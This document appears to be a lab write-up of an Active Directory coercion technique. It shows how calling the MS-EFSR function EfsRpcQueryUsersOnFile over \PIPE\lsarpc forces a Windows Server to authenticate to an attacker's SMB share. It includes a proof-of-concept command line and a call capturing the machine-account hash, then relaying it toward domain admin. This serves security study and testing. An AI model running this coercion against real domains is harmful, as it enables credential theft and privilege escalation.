# MS-EFSR - Remote call to EfsRpcQueryUsersOnFile (opnum 6)

## Summary

 - **Protocol**: [[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)

 - **Protocol UUID**: c681d488-d850-11d0-8c52-00c04fd90f7e

 - **Protocol version**: 1.0

 - **Function name**: [`EfsRpcQueryUsersOnFile`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/a058dc6c-bb7e-491c-9143-a5cb1f7e7cea)

 - **Function operation number**: `6`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine.

Then we need to connect to the remote SMB pipe `\PIPE\lsarpc` and bind to (uuid `c681d488-d850-11d0-8c52-00c04fd90f7e`, version `1.0`) in order to perform calls to RPC functions of the `MS-EFSR` protocol.

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Password123!" 192.168.2.51 192.168.2.1
```

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\lsarpc`. This pipe is connected to the protocol [[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) and allows to call RPC functions of this protocol. It will then call the remote [`EfsRpcQueryUsersOnFile`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/a058dc6c-bb7e-491c-9143-a5cb1f7e7cea) function on the Windows Server (192.168.2.1) with the following parameters:

```cpp
EfsRpcQueryUsersOnFile('\\\\192.168.2.51\\share\\file.txt\x00')
```

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share\file.txt` and therefore authenticate using its machine account. That's what we see in Responder on the bottom left terminal of my attacking machine.

Now that we have the hash of the machine account DC01$ (machine account always ends with a $), we can relay it to authenticate elsewhere as DC01$ and perform privileged actions where we can. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!

## Function technical detail

```cpp
DWORD EfsRpcQueryUsersOnFile(
   [in] handle_t binding_h,
   [in, string] wchar_t* FileName,
   [out] ENCRYPTION_CERTIFICATE_HASH_LIST** Users
 );
```



## References

 - Documentation of protocol [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31

 - Documentation of function `EfsRpcQueryUsersOnFile`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/a058dc6c-bb7e-491c-9143-a5cb1f7e7cea